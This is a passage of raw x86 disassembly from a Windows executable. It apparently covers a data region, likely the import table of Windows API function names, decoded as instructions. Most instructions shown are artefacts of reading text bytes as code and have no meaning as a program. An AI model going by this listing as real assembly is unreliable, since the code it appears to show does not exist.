  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
